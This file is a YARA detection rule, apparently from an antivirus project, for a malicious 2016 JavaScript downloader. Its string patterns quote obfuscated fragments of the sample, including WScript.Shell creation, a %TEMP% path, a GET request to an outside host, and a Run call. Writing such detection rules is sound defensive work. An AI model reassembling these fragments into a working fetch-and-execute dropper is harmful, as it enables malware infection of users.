rule sig_20160427_3e3a67533de448df6b7328aa04c04f64 {
  meta:
    description = "datamaliciousorder - file 20160427_3e3a67533de448df6b7328aa04c04f64.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2e27c197a3cb413545e1b9987aab28afe72c6677908531983ced46c27ffd9aec"

  strings:
    $s1  = "function BlocmDwmbb(KafrmHkypc, LbdslDxkvx){LfrbvGidis = LfrbvGidis * 1; return KafrmHkypc - LbdslDxkvx;};" fullword ascii
    $s2  = "function FkuwmNbyda() {return FhrvcRbdjo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"waZ2AW1" ascii
    $s3  = "function FkuwmNbyda() {return FhrvcRbdjo[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"waZ2AW1" ascii
    $s4  = "var FhrvcRbdjo = function MsyvyCqrea() {return OoienQtvat[DjmrvAegho](\"WScript\"+\".Shell\");}(), TfsmpOfjik = 11;" fullword ascii
    $s5  = "QpvhcXapir[DdcxgYgpmk](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var OoienQtvat = this[\"WScript\"];" fullword ascii
    $s7  = "if (QpvhcXapir[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function HorlvUazfv(){return MpmafArkpi + \"\";};" fullword ascii
    $s9  = "return BlocmDwmbb(IvhafWkplk, ZafboPtjmm);" fullword ascii
    $s10 = "function JpivtGpard() {return ((ClsjxRpqag == true) && (ClsjxRpqag == NtbtkVwxhd)) ? 1 : LfrbvGidis;};" fullword ascii
    $s11 = "function IivrgIkluh(IuuwwCpolz){FhrvcRbdjo[\"R\"+\"un\"](IuuwwCpolz, LfrbvGidis, LfrbvGidis);};" fullword ascii
    $s12 = "var ClsjxRpqag = false;" fullword ascii
    $s13 = "function NnqxnCydql()" fullword ascii
    $s14 = "ClsjxRpqag = true; " fullword ascii
    $s15 = "function DxmfxKjttf(){return DjmrvAegho;};" fullword ascii
    $s16 = "function RsnqoZfrty(){return 23;};" fullword ascii
    $s17 = "SedzpVzjmb = true;" fullword ascii
    $s18 = "var SedzpVzjmb = false;" fullword ascii
    $s19 = "var AdtjcQcssk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "NtbtkVwxhd = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}